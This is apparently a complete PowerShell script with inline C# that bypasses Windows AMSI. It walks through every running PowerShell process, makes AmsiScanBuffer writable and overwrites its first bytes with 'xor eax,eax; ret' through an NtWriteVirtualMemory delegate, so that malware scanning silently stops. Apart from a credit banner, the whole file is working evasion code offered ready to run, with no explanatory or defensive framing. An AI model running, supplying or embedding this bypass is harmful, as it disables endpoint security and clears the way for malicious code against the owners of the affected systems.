# ASCII Art Banner
$banner = @'

---------------------------------------------------------------
 Developed by Abhishek Sharma | Date: 10/08/24
 Modified by Hann1bl3L3ct3r   | Date: 3/7/2025
---------------------------------------------------------------
'@

Write-Host $banner -ForegroundColor Green

Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class AMSIBypass
{
    public const int PROCESS_VM_OPERATION = 0x0008;
    public const int PROCESS_VM_READ = 0x0010;
    public const int PROCESS_VM_WRITE = 0x0020;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;

    // Indirect syscall function pointer delegate
    public delegate int NtWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

    [DllImport("ntdll.dll")]
    public static extern int NtOpenProcess(out IntPtr ProcessHandle, uint DesiredAccess, [In] ref OBJECT_ATTRIBUTES ObjectAttributes, [In] ref CLIENT_ID ClientId);

    [DllImport("ntdll.dll")]
    public static extern int NtClose(IntPtr Handle);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public int Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }
}
"@

function PatchAMSI {
    param (
        [int]$processId
    )

    Write-Host "[+] Modifying AMSI for process ID: $processId"

    # Patch bytes to disable AMSI
    $patch = [byte[]](0x31, 0xC0, 0xC3)  # XOR EAX, EAX; RET

    # Setup for process access
    $objectAttributes = New-Object AMSIBypass+OBJECT_ATTRIBUTES
    $clientId = New-Object AMSIBypass+CLIENT_ID
    $clientId.UniqueProcess = [IntPtr]$processId
    $clientId.UniqueThread = [IntPtr]::Zero
    $objectAttributes.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($objectAttributes)

    $hHandle = [IntPtr]::Zero
    $status = [AMSIBypass]::NtOpenProcess([ref]$hHandle, [AMSIBypass]::PROCESS_VM_OPERATION -bor [AMSIBypass]::PROCESS_VM_READ -bor [AMSIBypass]::PROCESS_VM_WRITE, [ref]$objectAttributes, [ref]$clientId)

    if ($status -ne 0) {
        Write-Host "[-] Failed to open process. NtOpenProcess status: $status" -ForegroundColor Red
        return
    }

    Write-Host "[+] Loading amsi.dll..."
    $amsiHandle = [AMSIBypass]::LoadLibrary("amsi.dll")
    if ($amsiHandle -eq [IntPtr]::Zero) {
        Write-Host "[-] Failed to load amsi.dll." -ForegroundColor Red
        [AMSIBypass]::NtClose($hHandle)
        return
    }

    Write-Host "[+] Getting address of AmsiScanBuffer function..."
    $amsiScanBuffer = [AMSIBypass]::GetProcAddress($amsiHandle, "AmsiScanBuffer")
    if ($amsiScanBuffer -eq [IntPtr]::Zero) {
        Write-Host "[-] Failed to find AmsiScanBuffer function in amsi.dll." -ForegroundColor Red
        [AMSIBypass]::NtClose($hHandle)
        return
    }

    Write-Host "[+] Changing memory protection for AmsiScanBuffer..."
    $oldProtect = [UInt32]0
    $size = [UIntPtr]::new(3)
    $protectStatus = [AMSIBypass]::VirtualProtectEx($hHandle, $amsiScanBuffer, $size, [AMSIBypass]::PAGE_EXECUTE_READWRITE, [ref]$oldProtect)

    if (-not $protectStatus) {
        Write-Host "[-] Failed to change memory protection." -ForegroundColor Red
        [AMSIBypass]::NtClose($hHandle)
        return
    }

    Write-Host "[+] Patching memory for AmsiScanBuffer using indirect syscall..."
    $bytesWritten = [System.UInt32]0

    $delegateType = [AMSIBypass+NtWriteVirtualMemory]
    $ntWriteVirtualMemoryPtr = [AMSIBypass]::GetProcAddress([AMSIBypass]::GetModuleHandle("ntdll.dll"), "NtWriteVirtualMemory")
    $ntWriteVirtualMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ntWriteVirtualMemoryPtr, $delegateType)

    $status = $ntWriteVirtualMemory.Invoke($hHandle, $amsiScanBuffer, $patch, 3, [ref]$bytesWritten)

    if ($status -eq 0) {
        Write-Host "[+] AMSI successfully patched!" -ForegroundColor Green
    } else {
        Write-Host "[-] Failed to patch AMSI. NtWriteVirtualMemory status: $status" -ForegroundColor Red
    }

    Write-Host "[+] Restoring original memory protection..."
    $restoreStatus = [AMSIBypass]::VirtualProtectEx($hHandle, $amsiScanBuffer, $size, $oldProtect, [ref]$oldProtect)

    [AMSIBypass]::NtClose($hHandle)
}

function PatchAllPShells {
    Write-Host "[+] Patching all PowerShell processes..."
    Get-Process | Where-Object { $_.ProcessName -eq "powershell" } | ForEach-Object {
        PatchAMSI -processId $_.Id
    }
}

Write-Host "[+] Starting AMSI bypass script..."
PatchAllPShells
Write-Host "[+] AMSI bypass script completed." -ForegroundColor Green
